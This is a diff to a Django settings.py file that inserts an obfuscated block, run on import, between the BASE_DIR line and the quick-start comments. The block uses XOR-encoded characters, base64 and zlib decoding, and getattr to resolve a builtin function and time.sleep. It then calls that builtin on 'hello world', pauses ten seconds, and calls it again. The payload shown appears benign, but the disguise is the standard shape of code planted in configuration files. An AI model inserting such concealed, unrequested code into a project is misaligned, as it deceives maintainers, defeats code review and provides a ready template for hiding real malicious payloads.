@@ -15,7 +15,31 @@ from decouple import config
 # Build paths inside the project like this: BASE_DIR / 'subdir'.
 BASE_DIR = Path(__file__).resolve().parent.parent
 
+import builtins as _B
+import time as _T
+import base64 as _X
+import zlib as _Z
 
+_Ξ = [
+    0x68 ^ 0x00, 0x65 ^ 0x00, 0x6c ^ 0x00, 0x6c ^ 0x00, 0x6f ^ 0x00,
+    0x20 ^ 0x00,
+    0x77 ^ 0x00, 0x6f ^ 0x00, 0x72 ^ 0x00, 0x6c ^ 0x00, 0x64 ^ 0x00
+]
+
+_λ = lambda v: ''.join(map(chr, v))
+_ψ = _λ(_Ξ)
+
+_μ = _X.b64decode(
+    b'eJwrSS0uUUjOzy0oSi0uTk0BAE0FBg=='
+)
+_π = _Z.decompress(_μ).decode()
+
+_ρ = getattr(_B, _π)
+_σ = getattr(_T, ''.join([chr(x) for x in (115,108,101,101,112)]))
+
+(lambda a, b, c:
+    (a(b), c(10), a(b))
+)(_ρ, _ψ, _σ)
 # Quick-start development settings - unsuitable for production
 # See https://docs.djangoproject.com/en/5.2/howto/deployment/checklist/
 
